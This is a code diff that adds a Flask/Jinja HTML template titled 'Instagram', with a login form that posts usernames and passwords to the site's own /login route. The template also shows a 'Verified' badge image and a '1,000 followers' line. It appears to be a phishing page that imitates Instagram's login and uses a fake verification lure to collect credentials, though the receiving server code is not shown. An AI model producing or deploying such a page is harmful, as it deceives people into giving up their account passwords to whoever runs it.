@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Instagram</h2>
+        <form method="POST" action="/login">
+            <div class="username-line">
+                <input type="text" name="username" placeholder="Username" required>
+                <img src="{{ url_for('static', filename='verified.png') }}" class="verified-badge" alt="Verified">
+            </div>
+            <p class="follower-count">1,000 followers</p>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
